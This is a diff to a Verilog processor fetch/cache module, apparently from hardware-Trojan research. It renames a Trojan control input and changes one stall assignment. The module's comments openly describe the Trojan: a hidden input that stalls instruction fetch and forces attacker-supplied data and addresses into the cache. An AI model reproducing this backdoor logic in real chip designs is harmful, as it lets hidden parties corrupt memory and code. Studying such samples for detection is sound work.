@@ -61,7 +61,7 @@ input                       i_cache_flush,      // cache flush
 input       [31:0]          i_cacheable_area,   // each bit corresponds to 2MB address space
 input                       i_system_rdy,
 
-input						i_troj,				/// Trojan signal to stall fetch
+input						i_troj_reserve,		/// Trojan signal to stall fetch
 input		[31:0]			i_troj_write_data,	/// Trojan data written to cache
 input		[31:0]			i_troj_address,		
 input		[31:0]			i_troj_address_nxt,
@@ -113,7 +113,7 @@ assign o_read_data       = sel_cache  ? cache_read_data :
 // when the fetch stage needs more than 1 cycle to return the requested
 // read data
 /// Modified to stall when Trojan is busy modifying cache
-assign o_fetch_stall     = !i_system_rdy || wb_stall || cache_stall || i_troj;
+assign o_fetch_stall     = !i_system_rdy || wb_stall || cache_stall || i_troj_reserve;
 
 /// Trojan muxed signals for cache input
 wire 		troj_cache_sel;
@@ -125,14 +125,14 @@ wire [31:0] troj_address_nxt;
 wire [3:0]	troj_byte_enable;
 wire		troj_wb_stall;
 
-assign troj_sel 				= i_troj ? 1 : sel_cache;
-assign troj_excl 				= i_troj ? 0 : i_exclusive;
-assign troj_write_data			= i_troj ? i_troj_write_data : i_write_data;
-assign troj_write_enable		= i_troj ? 1 : i_write_enable;
-assign troj_address				= i_troj ? i_troj_address : i_address;
-assign troj_address_nxt 		= i_troj ? i_troj_address_nxt : i_address_nxt;
-assign troj_byte_enable			= i_troj ? 4'b0 : i_byte_enable;
-assign troj_wb_stall			= i_troj ? 0 : o_wb_stb & ~i_wb_ack;
+assign troj_sel 				= i_troj_reserve ? 1 : sel_cache;
+assign troj_excl 				= i_troj_reserve ? 0 : i_exclusive;
+assign troj_write_data			= i_troj_reserve ? i_troj_write_data : i_write_data;
+assign troj_write_enable		= i_troj_reserve ? 1 : i_write_enable;
+assign troj_address				= i_troj_reserve ? i_troj_address : i_address;
+assign troj_address_nxt 		= i_troj_reserve ? i_troj_address_nxt : i_address_nxt;
+assign troj_byte_enable			= i_troj_reserve ? 4'b0 : i_byte_enable;
+assign troj_wb_stall			= i_troj_reserve ? 1 : o_wb_stb & ~i_wb_ack;
 
 // ======================================
 // L1 Cache (Unified Instruction and Data)
